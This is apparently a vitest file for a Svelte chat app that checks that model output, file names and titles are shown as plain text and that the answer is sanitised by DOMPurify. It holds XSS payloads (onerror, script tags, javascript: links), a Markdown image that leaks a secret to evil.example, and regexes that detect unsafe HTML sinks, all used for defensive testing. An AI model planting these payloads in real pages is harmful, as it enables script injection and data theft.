/**
 * Text safety. Model output, a document's file name, a chat's title and a profile's
 * wording are strings the run code does not control, so:
 *
 *  - every helper that returns text for display hands a hostile string back as plain
 *    text (the same characters, or cut), never wrapped in markup and never escaped
 *    into entities that a component would then show literally;
 *  - no component of the run panel can turn text into markup, a link or a script;
 *  - the one place an answer is rendered as HTML, the message bubble, passes it
 *    through DOMPurify first.
 *
 * Rendering the components with hostile data is in `components.render.test.ts`.
 */
import { readdirSync, readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';

import { marked } from 'marked';
import { describe, expect, it } from 'vitest';

import type { OrchestrationChatRun, RunEffect, StepNote } from '../../api/orchestration';
import { directAnswerText } from '../activity';
import {
	KNOWLEDGE_SEARCH_TOOL,
	activeRunLabel,
	activeRunStatusText,
	answersDirectlyText,
	buildStartBody,
	documentRows,
	documentsSummary,
	instructionRows,
	knowledgeBasesLine,
	knowledgeBasesLineParts,
	proposeBlocker,
	routeText,
	runModeFacts,
	toolLabelList,
	toolsOffered,
	unavailableReason,
	unreadableReason
} from '../composer';
import { evidenceGate, evidenceHint, evidenceStatement } from '../evidence';
import {
	formatDeadline,
	formatUsd,
	formatValue,
	humanise,
	namedLineText,
	pluralise
} from '../format';
import { failureMessage } from '../load';
import { orchestratorPin, pinnedText, planView, receiptPin, searchLineParts } from '../plan';
import { currentSteps, runProgress, taskLatestStep, taskStatusLabel } from '../progress';
import { describeEffect, refusalText } from '../renderers';
import { runDetail, runHeadline, runTitle, stopReasonText } from '../status';
import { runSources } from '../sources';
import { setupView, toolView, turnView } from '../trace';
import { documents, profiles, run, trace } from './fixtures';
import { HOSTILE_STRINGS, expectPlainText } from './hostile';

// ---- the helpers --------------------------------------------------------------------------------

/** Every string in a value, however deeply it is nested. */
function strings(value: unknown): string[] {
	if (typeof value === 'string') return [value];
	if (Array.isArray(value)) return value.flatMap(strings);
	if (value && typeof value === 'object') return Object.values(value).flatMap(strings);
	return [];
}

function edited(
	base: OrchestrationChatRun,
	change: (copy: OrchestrationChatRun) => void
): OrchestrationChatRun {
	const copy = structuredClone(base);
	change(copy);
	return copy;
}

const packet = structuredClone(profiles('available').profiles[1]);
const [MSA] = documents().documents;

/** A task that is running, whose latest step is `step`, in a plan whose first task is `topic`. */
function runningWith(topic: string, step: StepNote): OrchestrationChatRun {
	return edited(run('one-child-done'), (copy) => {
		copy.status = 'running';
		copy.tree!.plan.children[0].task.topic = topic;
		copy.tree!.children[0].status = 'running';
		copy.tree!.children[0].effects = [
			{ ...copy.tree!.children[0].effects[0], status: 'completed', step }
		];
	});
}

const effectWith = (patch: Partial<RunEffect>): RunEffect => ({
	effect_key: 'topic:t1',
	status: 'completed',
	reserved_usd: '0.0000',
	charged_usd: '0.0000',
	intent: 'run_skill',
	outcome: 'success',
	...patch
});

/**
 * How a hostile string must come back out:
 * `exact` and `caseless` echo it, `none` never does, and `plain` only has to be plain.
 */
interface Sink {
	name: string;
	echo: 'exact' | 'caseless' | 'none' | 'plain';
	use: (hostile: string) => unknown;
}

const SINKS: Sink[] = [
	// composer
	{
		name: 'unavailableReason: the server’s words',
		echo: 'exact',
		use: (h) =>
			unavailableReason({
				...packet,
				available: false,
				reason: 'operator_disabled',
				reason_text: h
			})
	},
	{
		name: 'unavailableReason: a reason code',
		echo: 'none',
		use: (h) => unavailableReason({ ...packet, available: false, reason: h, reason_text: null })
	},
	{
		name: 'proposeBlocker: an unavailable profile’s words',
		echo: 'exact',
		use: (h) =>
			proposeBlocker({
				profile: { ...packet, available: false, reason: 'x', reason_text: h },
				goal: 'g',
				selectedCount: 1
			})
	},
	{
		name: 'activeRunLabel: a chat’s title',
		echo: 'exact',
		use: (h) =>
			activeRunLabel(
				{ root_id: 'r', status: 'running', profile: 'p', chat_id: 'c', chat_title: h },
				'other'
			)
	},
	{ name: 'activeRunStatusText: a status', echo: 'caseless', use: (h) => activeRunStatusText(h) },
	{
		name: 'toolLabelList: a label',
		echo: 'exact',
		use: (h) => toolLabelList([{ name: 'a_tool', label: h, phase: 'analysis' }])
	},
	{
		name: 'toolLabelList: a name with no label',
		echo: 'caseless',
		use: (h) => toolLabelList([{ name: h, label: '', phase: 'analysis' }])
	},
	{
		name: 'runModeFacts: model and amounts',
		echo: 'exact',
		use: (h) =>
			runModeFacts({
				...packet,
				model: h,
				budget_usd: h,
				planning_allowance_usd: h,
				child_allowance_usd: h
			})
	},
	{
		name: 'unreadableReason: a code',
		echo: 'caseless',
		use: (h) => unreadableReason({ ...MSA, selectable: false, reason: h })
	},
	{
		name: 'documentRows: a file name and a reason',
		echo: 'exact',
		use: (h) =>
			documentRows(
				[
					{ ...MSA, filename: h },
					{ ...MSA, selectable: false, reason: h }
				],
				[],
				8
			)
	},
	{
		name: 'buildStartBody: the request',
		echo: 'exact',
		use: (h) => buildStartBody({ requestId: 'r', profile: packet, goal: h, fileIds: [] })
	},
	{
		name: 'unavailableReason: a profile’s title in the sentence about it',
		echo: 'exact',
		use: (h) => [
			unavailableReason({
				...packet,
				available: false,
				reason: 'operator_disabled',
				reason_text: null,
				title: h
			}),
			unavailableReason({
				...packet,
				available: false,
				reason: 'project_required',
				reason_text: null,
				title: h
			})
		]
	},
	{
		name: 'routeText: the model and the tier',
		echo: 'exact',
		use: (h) => routeText({ ...packet, model: h, routed_tier: 2 })
	},
	{
		name: 'runModeFacts: the reasoning effort',
		echo: 'exact',
		use: (h) => runModeFacts({ ...packet, reasoning_effort: h })
	},
	{
		name: 'instructionRows: a prompt’s or a skill’s name, version and role',
		echo: 'exact',
		use: (h) =>
			instructionRows({
				...packet,
				instructions: [
					{ role: 'orchestrator', kind: 'prompt', name: h, version: h },
					{ role: 'sub-agent', kind: 'skill', name: h, version: h },
					{ role: h as 'orchestrator', kind: 'prompt', name: 'f/r.v1', version: '1' }
				]
			}).flatMap((row) => [row.label, row.name, row.detail])
	},
	{
		name: 'documentsSummary: the owner’s file names',
		echo: 'exact',
		use: (h) => {
			const [file] = documents().documents;
			return documentsSummary({
				documents: [{ ...file, filename: h }],
				selected: [file.file_id],
				min: 0
			});
		}
	},
	// evidence
	{
		name: 'evidenceGate',
		echo: 'exact',
		use: (h) =>
			evidenceGate({
				evidence: 'citations',
				evidence_result: { gate_status: h, checked: 1, matched: 1, unmatched: 0 }
			})
	},
	{
		name: 'evidenceStatement and evidenceHint',
		echo: 'none',
		use: (h) => {
			const input = {
				evidence: h as 'citations',
				evidence_result: { gate_status: h, checked: 3, matched: 1, unmatched: 2 }
			};
			const cited = { ...input, evidence: 'citations' as const };
			return [evidenceStatement(input), evidenceStatement(cited), evidenceHint(cited)];
		}
	},
	// plan
	{
		name: 'planView: task text, skill, tools, files, amounts, model and reads',
		echo: 'exact',
		use: (h) =>
			planView(
				edited(run('documents.awaiting-approval'), (copy) => {
					const plan = copy.tree!.plan;
					for (const child of plan.children) {
						child.task = {
							topic: h,
							question: h,
							boundaries: h,
							output_contract: h,
							stopping_condition: h
						};
						child.budget_usd = h;
						child.execution!.skill!.name = h;
					}
					for (const doc of plan.documents!) doc.filename = h;
					for (const child of copy.tree!.children) {
						child.tools = [{ name: 'read_document', label: h, phase: 'analysis' }];
					}
					plan.budget_usd = h;
					plan.root_allowance_usd = h;
					copy.planning.planning_allowance_usd = h;
					copy.planning.model = h;
					copy.effects[0].charged_usd = h;
					copy.reads = h;
				})
			)
	},
	// status and progress
	{
		name: 'runHeadline: an unknown status',
		echo: 'caseless',
		use: (h) => runHeadline({ status: h, stop_reason: h })
	},
	{
		name: 'runDetail: an unknown stop reason',
		echo: 'caseless',
		use: (h) => [
			runDetail({ status: 'failed', stop_reason: h }),
			runDetail({ status: h, stop_reason: h })
		]
	},
	{ name: 'stopReasonText', echo: 'caseless', use: (h) => stopReasonText(h) },
	{ name: 'taskStatusLabel', echo: 'caseless', use: (h) => taskStatusLabel(h) },
	{
		name: 'runProgress: a stop reason',
		echo: 'caseless',
		use: (h) => runProgress({ status: 'failed', stop_reason: h, tree: null })
	},
	{
		name: 'currentSteps: a task’s topic and its latest step',
		echo: 'exact',
		use: (h) => currentSteps(runningWith(h, { kind: 'x_step', label: h }))
	},
	{
		name: 'taskLatestStep: a running task’s latest step',
		echo: 'exact',
		use: (h) => taskLatestStep(runningWith('topic', { kind: 'x_step', label: h }).tree!.children[0])
	},
	// renderers
	{
		name: 'describeEffect: an unknown kind with a hostile label, reason, key and value',
		echo: 'exact',
		use: (h) => {
			const view = describeEffect(
				effectWith({
					step: { kind: 'x_step', label: h, reason: h, summary: { [h]: h, other: h } }
				})
			);
			return [view.text, view.facts, view.reason];
		}
	},
	{
		name: 'describeEffect: a document read of a hostile file name, a note, a refusal',
		echo: 'exact',
		use: (h) => [
			describeEffect(
				effectWith({
					step: { kind: 'document_read', reason: h, summary: { document: 1, filename: h } }
				})
			),
			describeEffect(
				effectWith({ step: { kind: 'note_saved', summary: { name: h, revision: 1 } } })
			),
			describeEffect(effectWith({ step: { kind: 'note_read', summary: { name: h } } })),
			describeEffect(effectWith({ step: { kind: 'tool_refused', label: h, summary: { code: h } } }))
		]
	},
	{
		name: 'describeEffect: an effect with no step note and a hostile key and intent',
		echo: 'caseless',
		use: (h) => describeEffect(effectWith({ step: null, effect_key: h, intent: h })).text
	},
	{ name: 'refusalText', echo: 'caseless', use: (h) => refusalText(h) },
	// format
	{ name: 'humanise', echo: 'caseless', use: (h) => humanise(h) },
	{ name: 'pluralise', echo: 'exact', use: (h) => pluralise(2, h) },
	{ name: 'formatUsd', echo: 'exact', use: (h) => formatUsd(h) },
	{ name: 'formatDeadline', echo: 'plain', use: (h) => formatDeadline(h) },
	{ name: 'formatValue: a string', echo: 'exact', use: (h) => formatValue(h) },
	{
		name: 'formatValue: inside a structure',
		echo: 'plain',
		use: (h) => formatValue({ a: h, b: [h] })
	},
	// the evidence line for a run that read no document
	{
		name: 'evidenceStatement: a run that read no document, whatever its kind of evidence or packet says',
		echo: 'none',
		use: (h) => [
			evidenceStatement({
				evidence: 'unverified',
				evidence_result: null,
				planning: { documents: [] }
			}),
			evidenceStatement({
				evidence: h as 'unverified',
				evidence_result: null,
				planning: { documents: [] }
			}),
			evidenceStatement({
				evidence: 'unverified',
				evidence_result: null,
				planning: { documents: [] },
				packet: h
			})
		]
	},
	// the heading of a run message and what the orchestrator is pinned to
	{
		name: 'runTitle: a profile title, a prompt version and a model',
		echo: 'exact',
		use: (h) =>
			runTitle({
				profile_title: h,
				planning: {
					root: { skill: { name: 'n/o.v1', digest: 'd', kind: 'prompt' } },
					root_skill_version: h,
					model: h
				}
			}).text
	},
	{
		name: 'pinnedText: a skill’s or a prompt file’s name and version',
		echo: 'exact',
		use: (h) => [pinnedText({ name: h }, h), pinnedText({ name: h, kind: 'prompt' }, h)]
	},
	{
		name: 'orchestratorPin: the name, version and digest of what the orchestrator is pinned to',
		echo: 'exact',
		use: (h) =>
			orchestratorPin(
				edited(run('harness.completed'), (copy) => {
					copy.tree!.plan.root.skill = { name: h, digest: h, kind: 'prompt' };
					copy.planning.root_skill_version = h;
				})
			)
	},
	// how a call was set up, and what the model wrote
	{
		name: 'setupView: the pinned system message, its text, the opening and the tools',
		echo: 'exact',
		use: (h) => {
			const call = structuredClone(trace('child.completed').calls[0]);
			call.system = { kind: 'prompt', name: h, version: h, digest: h, text: h };
			call.opening = h;
			call.tools = [
				{ type: 'function', function: { name: h, description: h, parameters: { type: h } } }
			];
			const view = setupView(call);
			return [
				view.system,
				view.systemText,
				view.opening,
				view.tools.map((tool) => [tool.name, tool.description])
			];
		}
	},
	{
		name: 'toolView: a name and a description in either shape',
		echo: 'exact',
		use: (h) =>
			[
				toolView({ name: h, description: h }),
				toolView({ function: { name: h, description: h } })
			].flatMap((tool) => [tool.name, tool.description])
	},
	{
		name: 'turnView: what a model wrote and the tool calls it made',
		echo: 'exact',
		use: (h) => {
			const turn = turnView({
				effect_key: 'k',
				status: 'completed',
				text: h,
				tool_calls: [{ id: 'c', name: h, arguments: h }]
			});
			return [turn.text, turn.toolCalls.map((call) => [call.name, call.arguments])];
		}
	},
	{
		name: 'failureMessage: what an error said',
		echo: 'exact',
		use: (h) => [failureMessage(new Error(h)), failureMessage(h)]
	},
	// a request answered by the orchestrator itself, and a plan handed over as a tool call
	{
		name: 'evidenceStatement: an answer the orchestrator gave by itself, whatever its evidence, gate or sources say',
		echo: 'none',
		use: (h) => [
			evidenceStatement({ evidence: 'unverified', evidence_result: null, answered_directly: true }),
			evidenceStatement({
				evidence: h as 'unverified',
				evidence_result: null,
				planning: { documents: [] },
				answered_directly: true
			}),
			evidenceStatement({
				evidence: 'citations',
				evidence_result: { gate_status: h, checked: 3, matched: 1, unmatched: 2 },
				planning: { documents: [{}] },
				answered_directly: true,
				sources: [h]
			})
		]
	},
	{
		name: 'runDetail: a stop reason the page has never seen, on a run that stopped any way at all',
		echo: 'caseless',
		use: (h) =>
			['halted', 'expired', 'closed', 'rejected', 'uncertain', 'failed', 'quarantined'].map(
				(status) => runDetail({ status, stop_reason: h })
			)
	},
	{
		name: 'directAnswerText: what the orchestrator answered by itself, for the receipt page',
		echo: 'exact',
		use: (h) => directAnswerText({ answered_directly: true, direct_answer: h }) ?? []
	},
	{
		name: 'receiptPin: the name and version of a skill or a prompt file',
		echo: 'exact',
		use: (h) => [
			receiptPin({ name: h, version: h, kind: 'prompt' }),
			receiptPin({ name: h, version: h }),
			receiptPin({ name: h, kind: h })
		]
	},
	{
		name: 'toolsOffered and toolLabelList: a hostile label on a tool, with or without the search',
		echo: 'exact',
		use: (h) => {
			const tools = [
				{ name: 'a_tool', label: h, phase: 'analysis' },
				{ name: KNOWLEDGE_SEARCH_TOOL, label: h, phase: 'analysis' }
			];
			return [
				toolLabelList(toolsOffered(tools, null)),
				toolLabelList(toolsOffered(tools, documents('knowledge-bases')))
			];
		}
	},
	{
		name: 'evidenceStatement: nothing could be checked, whatever the sources and gate say',
		echo: 'none',
		use: (h) => [
			evidenceStatement({
				evidence: 'citations',
				evidence_result: null,
				planning: { documents: [] },
				sources: [h]
			}),
			evidenceStatement({
				evidence: 'citations',
				evidence_result: null,
				planning: { documents: [h] },
				sources: [h]
			}),
			evidenceStatement({
				evidence: 'citations',
				evidence_result: { gate_status: h, checked: 2, matched: 1, unmatched: 0, unresolved: 2 },
				planning: { documents: [] },
				sources: [h]
			})
		]
	},
	{
		name: 'describeEffect: the first call of a run, read in the run it is in',
		echo: 'none',
		use: (h) => [
			describeEffect(effectWith({ step: { kind: 'planning', label: h }, intent: 'plan' }), {
				plansByTool: true
			}).text,
			describeEffect(effectWith({ step: null, effect_key: 'chat:plan:v1', intent: h }), {
				plansByTool: true
			}).text,
			describeEffect(effectWith({ step: null, effect_key: h, intent: 'plan' }), {
				plansByTool: true
			}).text
		]
	},
	{
		name: 'answersDirectlyText: whatever the server says of the profile',
		echo: 'none',
		use: (h) =>
			[
				answersDirectlyText({ answers_directly: true }),
				answersDirectlyText({ answers_directly: h as unknown as boolean })
			].filter((text): text is string => text !== null)
	},
	{
		name: 'runDetail and stopReasonText: a plan that was not handed over, and one that carried a placeholder',
		echo: 'none',
		use: (h) => [
			runDetail({ status: 'failed', stop_reason: 'plan_not_handed_over' }),
			runDetail({ status: 'failed', stop_reason: 'plan_has_placeholders' }),
			runDetail({
				status: 'planning',
				stop_reason: null,
				planning: { terms: { planning: h } }
			}),
			runHeadline({ status: 'planning', stop_reason: null, planning: { terms: { planning: h } } })
		]
	},
	// knowledge bases a task may search, and what a search found
	{
		name: 'describeEffect: a search of the knowledge bases, with a hostile file name and reason',
		echo: 'exact',
		use: (h) => {
			const view = describeEffect(
				effectWith({
					step: {
						kind: 'knowledge_search',
						label: h,
						reason: h,
						summary: {
							passages: 1,
							sources: [{ number: 1, file_id: 'f', document_id: 'd', filename: h }],
							listed: 1,
							searched: 1,
							failed: 0,
							withheld: 0
						}
					}
				})
			);
			return [view.text, view.facts, view.reason];
		}
	},
	{
		name: 'describeEffect: a search whose summary holds a hostile value where a figure belongs',
		echo: 'none',
		use: (h) => {
			const view = describeEffect(
				effectWith({
					step: {
						kind: 'knowledge_search',
						summary: { passages: h, sources: h, listed: h, searched: h, failed: h, withheld: h }
					}
				})
			);
			return [view.text, view.facts];
		}
	},
	{
		name: 'runSources: a file name, and a session that is hostile',
		echo: 'exact',
		use: (h) =>
			runSources(
				edited(run('knowledge.completed'), (copy) => {
					copy.sources = [
						{ number: 1, file_id: h, filename: h, session_id: copy.sources![0].session_id },
						{ number: 2, file_id: h, filename: 'a.txt', session_id: h }
					];
				})
			).flatMap((row) => [row.filename, row.text])
	},
	{
		name: 'knowledgeBasesLine: names of knowledge bases, and a count that is hostile',
		echo: 'exact',
		use: (h) => [
			knowledgeBasesLine({
				knowledge_bases: [
					{ knowledge_base_id: h, name: h },
					{ knowledge_base_id: 'b', name: 'Travel' }
				],
				knowledge_bases_omitted: 2
			}),
			knowledgeBasesLine({
				knowledge_bases: [{ knowledge_base_id: 'a', name: 'Travel' }],
				knowledge_bases_omitted: h as unknown as number
			})
		]
	},
	{
		name: 'planView: the knowledge bases the tasks of a plan may search',
		echo: 'exact',
		use: (h) =>
			planView(
				edited(run('knowledge.awaiting-approval'), (copy) => {
					for (const kb of copy.tree!.plan.knowledge_bases!) kb.name = h;
				})
			)!.knowledgeBasesLine
	},
	{
		name: 'knowledgeBasesLineParts: the names, whole and one to an item, and the sentence round them',
		echo: 'exact',
		use: (h) => [
			knowledgeBasesLineParts({
				knowledge_bases: [
					{ knowledge_base_id: h, name: h },
					{ knowledge_base_id: 'b', name: 'Travel' }
				],
				knowledge_bases_omitted: 2
			}),
			knowledgeBasesLineParts({
				knowledge_bases: [{ knowledge_base_id: 'a', name: 'Travel' }],
				knowledge_bases_omitted: h as unknown as number
			})
		]
	},
	{
		name: 'planView: the knowledge bases of a plan, in pieces',
		echo: 'exact',
		use: (h) =>
			planView(
				edited(run('knowledge.awaiting-approval'), (copy) => {
					for (const kb of copy.tree!.plan.knowledge_bases!) kb.name = h;
				})
			)!.knowledgeBases
	},
	{
		name: 'searchLineParts: the names of the knowledge bases a plan names',
		echo: 'exact',
		use: (h) => [searchLineParts([h, 'Travel']), searchLineParts([h])]
	},
	{
		name: 'namedLineText: a sentence made of the pieces and a hostile name',
		echo: 'exact',
		use: (h) => namedLineText({ lead: 'May search: ', names: [h, 'Travel'], tail: '.' })
	}
];

describe('a hostile string through every helper that returns text for display', () => {
	it('covers the markup and link shapes that matter', () => {
		const joined = HOSTILE_STRINGS.join('\n');
		expect(joined).toContain('<img src=x onerror=alert(1)>');
		expect(joined).toContain('<script>alert(1)</script>');
		expect(joined).toContain('[x](javascript:alert(1))');
	});

	for (const sink of SINKS) {
		describe(sink.name, () => {
			it.each(HOSTILE_STRINGS.map((text) => [text]))('%s', (hostile) => {
				const out = sink.use(hostile);
				const texts = strings(out);
				expect(texts.length, 'produced some text').toBeGreaterThan(0);
				for (const text of texts) expectPlainText(text, hostile, `${sink.name} / ${hostile}`);
				const echoed = texts.some((text) => text.includes(hostile));
				const echoedAnyCase = texts.some((text) =>
					text.toLowerCase().includes(hostile.toLowerCase())
				);
				if (sink.echo === 'exact') expect(echoed, 'echoes the text intact').toBe(true);
				if (sink.echo === 'caseless') expect(echoedAnyCase, 'echoes the text').toBe(true);
				if (sink.echo === 'none') expect(echoedAnyCase, 'does not echo it').toBe(false);
			});
		});
	}

	it('hands back long text cut, not wrapped, where it cuts at all', () => {
		const long = `<img src=x onerror=alert(1)>${'x'.repeat(400)}`;
		expect(formatValue({ a: long })).toBe(`${JSON.stringify({ a: long }).slice(0, 160)}…`);
	});
});

// ---- the components ----------------------------------------------------------------------------------

const COMPONENTS = fileURLToPath(new URL('../../components/run/', import.meta.url));
const MESSAGE_BUBBLE = fileURLToPath(
	new URL('../../components/MessageBubble.svelte', import.meta.url)
);

/** Source without its comments, which may say `{@html}` in order to forbid it. */
function withoutComments(source: string): string {
	return source
		.replace(/<!--[\s\S]*?-->/g, '')
		.replace(/\/\*[\s\S]*?\*\//g, '')
		.replace(/(^|\s)\/\/[^\n]*/g, '$1');
}

const code = (path: string): string => withoutComments(readFileSync(path, 'utf8'));

const componentFiles = readdirSync(COMPONENTS)
	.filter((name) => name.endsWith('.svelte'))
	.sort();

/** What would let text become markup, a script, a link or a navigation. */
const FORBIDDEN: [string, RegExp][] = [
	['{@html', /\{@html\b/],
	['innerHTML or outerHTML', /\b(?:inner|outer)HTML\b/],
	['insertAdjacentHTML', /insertAdjacentHTML/],
	['document.write', /document\s*\.\s*write/],
	['eval or new Function', /\beval\s*\(|\bnew\s+Function\s*\(/],
	['a dynamic element', /<svelte:element\b/],
	[
		'a link, image, frame, embed, form or other element that loads or navigates',
		/<(?:a|img|iframe|object|embed|form|link|base|meta|math|svg|video|audio|source)\b/i
	],
	['a URL attribute', /\b(?:href|src|srcdoc|action|formaction|xlink:href|poster)\s*=/i]
];

describe('the scan of the components', () => {
	const flagged = (source: string) =>
		FORBIDDEN.filter(([, pattern]) => pattern.test(withoutComments(source))).map(([what]) => what);

	it('sees each thing it forbids', () => {
		expect(flagged('<p>{@html text}</p>')).toEqual(['{@html']);
		expect(flagged('node.innerHTML = text;')).toEqual(['innerHTML or outerHTML']);
		expect(flagged('el.insertAdjacentHTML("beforeend", text)')).toEqual(['insertAdjacentHTML']);
		expect(flagged('eval(text)')).toEqual(['eval or new Function']);
		expect(flagged('<a href={link}>x</a>')).toHaveLength(2);
		expect(flagged('<img src={link} />')).toHaveLength(2);
		expect(flagged('<svelte:element this={tag} />')).toEqual(['a dynamic element']);
	});

	it('ignores a comment that names what it forbids, and a plain element', () => {
		expect(flagged('<!-- never {@html} -->\n<p>{text}</p>')).toEqual([]);
		expect(flagged('/** never innerHTML */\nconst a = 1;')).toEqual([]);
		expect(flagged('// never {@html}\nconst a = 1;')).toEqual([]);
		expect(
			flagged(
				'<script lang="ts">export let a = 1;</script><div class="x">{a}</div><span>{a}</span>'
			)
		).toEqual([]);
	});

	it('reads the arguments of a call, however nested', () => {
		expect(callArguments('x = f(a, g(b, c), "d,e", [1, 2], { k: 1 }) as T', 'f')).toEqual([
			'a',
			'g(b, c)',
			'"d,e"',
			'[1, 2]',
			'{ k: 1 }'
		]);
		expect(
			callArguments(
				'DOMPurify.sanitize(marked.parse(x, { async: false }) as string)',
				'DOMPurify.sanitize'
			)
		).toHaveLength(1);
		expect(
			callArguments('DOMPurify.sanitize(html, { ADD_TAGS: ["x"] })', 'DOMPurify.sanitize')
		).toHaveLength(2);
		expect(callArguments('nothing here', 'f')).toEqual([]);
	});
});

describe('the model picker, which shows a model name and a reason the server wrote', () => {
	const source = code(
		fileURLToPath(new URL('../../components/ModelPicker.svelte', import.meta.url))
	);

	it('has no way to turn text into markup, a script, a link or a navigation', () => {
		for (const [what, pattern] of FORBIDDEN) {
			expect(pattern.test(source), `ModelPicker uses ${what}`).toBe(false);
		}
	});
});

describe('the message list, which draws the empty thread and hands each message to its bubble', () => {
	const source = code(
		fileURLToPath(new URL('../../components/MessageList.svelte', import.meta.url))
	);

	it('has no way to turn text into markup, a script, a link or a navigation', () => {
		for (const [what, pattern] of FORBIDDEN) {
			expect(pattern.test(source), `MessageList uses ${what}`).toBe(false);
		}
	});

	it('is read, so the check above looks at something', () => {
		expect(source).toContain('No messages yet.');
		expect(source).toContain('<MessageBubble');
	});
});

describe('the components of the run panel', () => {
	it('are found, so the checks below look at something', () => {
		expect(componentFiles.length).toBeGreaterThanOrEqual(12);
		for (const name of [
			'RunMessage',
			'RunPlanCard',
			'RunChildCard',
			'RunStepList',
			'RunDocumentPicker',
			'RunModePanel',
			'RunActiveNotice',
			'RunAnswerNote'
		]) {
			expect(componentFiles, name).toContain(`${name}.svelte`);
		}
	});

	it.each(componentFiles)('%s never uses {@html', (name) => {
		expect(code(`${COMPONENTS}${name}`)).not.toMatch(/\{@html\b/);
	});

	it.each(componentFiles)(
		'%s has no way to turn text into markup, a script, a link or a navigation',
		(name) => {
			const source = code(`${COMPONENTS}${name}`);
			for (const [what, pattern] of FORBIDDEN) {
				expect(pattern.test(source), `${name} uses ${what}`).toBe(false);
			}
		}
	);
});

const HELPERS = fileURLToPath(new URL('../', import.meta.url));
const helperFiles = readdirSync(HELPERS, { withFileTypes: true })
	.filter((entry) => entry.isFile() && entry.name.endsWith('.ts'))
	.map((entry) => entry.name)
	.sort();

/** The one helper whose job is to produce HTML, for the answer. It has its own tests. */
const MARKUP_HELPER = 'answer.ts';

describe('the helpers in run/', () => {
	it('are found, so the check below looks at something', () => {
		expect(helperFiles).toEqual(
			expect.arrayContaining(['composer.ts', 'format.ts', 'plan.ts', 'renderers.ts', 'status.ts'])
		);
		expect(helperFiles).toContain(MARKUP_HELPER);
	});

	// ADR 0038 D2: model- and document-derived text is data. A helper that built a tag, or wrote
	// an entity, would hand a component something it would have to render as HTML.
	it.each(helperFiles.filter((name) => name !== MARKUP_HELPER))(
		'%s builds no markup and no entities',
		(name) => {
			const source = code(`${HELPERS}${name}`);
			expect(source).not.toMatch(
				/<\/?(?:span|b|i|em|strong|a|p|br|div|code|mark|li|ul|ol|pre|small|sub|sup|u|s|img|script|style|svg|iframe)\b/i
			);
			expect(source).not.toMatch(/&(?:lt|gt|amp|quot|apos|nbsp|#\d+|#x[0-9a-f]+);/i);
			expect(source).not.toMatch(
				/innerHTML|outerHTML|dangerouslySetInnerHTML|from\s+['"](?:marked|dompurify)['"]/
			);
		}
	);

	it('has one helper that builds HTML, and it is the one the answer goes through', () => {
		expect(code(`${HELPERS}${MARKUP_HELPER}`)).toMatch(/export function runAnswerHtml\(/);
	});
});

/** The text between the brackets of the first call to `callee`, and the arguments in it. */
function callArguments(source: string, callee: string): string[] {
	const start = source.indexOf(`${callee}(`);
	if (start === -1) return [];
	let depth = 0;
	let quote = '';
	let current = '';
	const found: string[] = [];
	for (let i = start + callee.length; i < source.length; i += 1) {
		const char = source[i];
		if (quote) {
			current += char;
			if (char === quote && source[i - 1] !== '\\') quote = '';
			continue;
		}
		if (char === "'" || char === '"' || char === '`') {
			quote = char;
			current += char;
			continue;
		}
		if ('([{'.includes(char)) {
			depth += 1;
			if (depth > 1) current += char;
			continue;
		}
		if (')]}'.includes(char)) {
			depth -= 1;
			if (depth === 0) {
				found.push(current.trim());
				return found;
			}
			current += char;
			continue;
		}
		if (char === ',' && depth === 1) {
			found.push(current.trim());
			current = '';
			continue;
		}
		current += char;
	}
	return found;
}

describe('the answer, where it is rendered as HTML', () => {
	// A delivered answer is the run message's own content. It is the one thing in a run that is
	// shown as Markdown: by the message bubble, through `run/answer.ts` (tested in `answer.test.ts`).
	const bubble = code(MESSAGE_BUBBLE);
	const assignment = /\$:\s*rendered\s*=([\s\S]*?);/.exec(bubble);

	it('is rendered by MessageBubble, through one {@html} that holds nothing else', () => {
		expect(bubble.match(/\{@html\b[^}]*\}/g)).toEqual(['{@html rendered}']);
		expect(bubble).toMatch(/import \{ runAnswerHtml \} from '\.\.\/run\/answer';/);
		expect(bubble).toMatch(/import DOMPurify from 'dompurify';/);
		expect(bubble).toMatch(/import \{ marked \} from 'marked';/);
	});

	it('is HTML from three calls and an empty string, and from nothing else', () => {
		expect(assignment, 'the line that sets `rendered`').not.toBeNull();
		const expression = assignment![1];
		const calls = [...expression.matchAll(/([A-Za-z_$][\w$.]*)\s*\(/g)].map((match) => match[1]);
		expect([...new Set(calls)].sort()).toEqual([
			'DOMPurify.sanitize',
			'marked.parse',
			'runAnswerHtml'
		]);
		// Only an assistant message has any; and a run message gets the strict treatment.
		expect(expression).toMatch(/message\.role\s*!==\s*'assistant'\s*\?\s*''/);
		expect(expression).toMatch(/isRun\s*\?\s*runAnswerHtml\(\s*message\.content \|\| ''\s*\)/);
	});

	it('is made safe by DOMPurify in its default configuration when it is not a run’s', () => {
		const expression = assignment![1];
		expect(expression).toMatch(/DOMPurify\.sanitize\(\s*marked\.parse\(/);
		// `sanitize` is given the Markdown and nothing else: no option that could loosen it.
		expect(callArguments(expression, 'DOMPurify.sanitize')).toHaveLength(1);
		expect(bubble).not.toMatch(/DOMPurify\s*\.\s*(?:setConfig|addHook|removeHook)/);
		expect(bubble).not.toMatch(
			/ADD_TAGS|ADD_ATTR|ALLOW_UNKNOWN_PROTOCOLS|ALLOWED_URI_REGEXP|FORCE_BODY|RETURN_DOM|SAFE_FOR_TEMPLATES|WHOLE_DOCUMENT|ALLOW_DATA_ATTR|CUSTOM_ELEMENT_HANDLING/
		);
	});

	it('is shown as text, in a <pre>, in the receipt view where there is no message around it', () => {
		const panel = code(`${COMPONENTS}RunMessage.svelte`);
		expect(panel).toMatch(/<pre class="answer-text">\{tree\.result\.summary\}<\/pre>/);
		expect(panel).toMatch(/<pre class="answer-text">\{tree\.partial_summary\}<\/pre>/);
		// The orchestrator's own answer, where it gave one, is shown the same way.
		expect(panel).toMatch(/<pre class="answer-text">\{directAnswer\}<\/pre>/);
	});

	// `marked` on its own does not make anything safe: it passes raw HTML through, links to any
	// scheme and draws an image from any address. For an ordinary reply DOMPurify is then the only
	// thing between the text and the page, so the checks above are not decoration. (DOMPurify itself
	// needs a DOM; it is not run here. A run's answer has the strict Markdown step in front of it.)
	it('needs a sanitiser: Markdown alone lets markup, scripts and remote images through', () => {
		const html = marked.parse(
			[
				'<img src=x onerror=alert(1)>',
				'',
				'[x](javascript:alert(1))',
				'',
				'![leak](https://evil.example/c?d=SECRET)'
			].join('\n'),
			{ async: false }
		) as string;
		expect(html).toContain('<img src=x onerror=alert(1)>');
		expect(html).toContain('href="javascript:alert(1)"');
		expect(html).toContain('<img src="https://evil.example/c?d=SECRET"');
	});
});
